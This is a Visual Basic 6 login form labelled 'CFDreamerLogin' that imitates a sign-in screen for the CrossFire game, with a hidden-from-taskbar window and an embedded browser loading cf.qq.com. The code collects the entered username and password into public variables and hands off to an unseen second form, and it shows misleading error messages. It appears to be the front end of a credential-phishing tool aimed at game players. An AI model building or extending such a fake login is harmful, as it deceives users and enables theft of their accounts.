VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "CFDreamerLogin"
   ClientHeight    =   6615
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   8640
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6615
   ScaleWidth      =   8640
   StartUpPosition =   2  '屏幕中心
   Begin VB.CommandButton Command1 
      BackColor       =   &H00404040&
      Caption         =   "登陆游戏"
      Default         =   -1  'True
      Height          =   855
      Left            =   3840
      MaskColor       =   &H00404040&
      Picture         =   "Form1.frx":1042
      Style           =   1  'Graphical
      TabIndex        =   5
      Top             =   4080
      Width           =   2055
   End
   Begin VB.TextBox Text2 
      Height          =   270
      IMEMode         =   3  'DISABLE
      Left            =   1560
      PasswordChar    =   "*"
      TabIndex        =   2
      Top             =   4680
      Width           =   1935
   End
   Begin VB.TextBox Text1 
      Height          =   270
      Left            =   1560
      TabIndex        =   1
      Top             =   4200
      Width           =   1935
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   600
      Top             =   360
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   5415
      Left            =   -3240
      TabIndex        =   0
      Top             =   -1800
      Width           =   12135
      ExtentX         =   21405
      ExtentY         =   9551
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.Image Image2 
      Height          =   615
      Left            =   6480
      Picture         =   "Form1.frx":2084
      Stretch         =   -1  'True
      Top             =   4200
      Width           =   1215
   End
   Begin VB.Image Image1 
      Height          =   255
      Left            =   0
      Picture         =   "Form1.frx":4A06
      Stretch         =   -1  'True
      Top             =   5760
      Width           =   8655
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Powerd By Dreamer Co., IncDreamer(R)1997-2010.All right Reserved."
      ForeColor       =   &H00404040&
      Height          =   255
      Left            =   240
      TabIndex        =   6
      Top             =   6240
      Width           =   8055
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "密码:"
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   4680
      Width           =   1215
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "用户名:"
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   4200
      Width           =   1215
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public usern As String
Public passw As String
Private Sub Command1_Click()
If Text1.Text = "" Then
MsgBox "请输入用户名", vbInformation, "提示"
MsgBox "登陆发生错误，请重新登陆！", vbCritical, "DP"
End
ElseIf Text1.Text <> "" And Text2.Text = "" Then
MsgBox "您的密码过于简单，请及时更改！", vbExclamation, "DP"
End If
Form2.Show
usern = Text1.Text
passw = Text2.Text
Unload Me
End Sub

Private Sub Form_Load()
App.TaskVisible = False
End Sub

Private Sub Timer1_Timer()
Text1.SetFocus
Dim url As String
url = "cf.qq.com"
WebBrowser1.Navigate url
Timer1.Interval = 0
End Sub
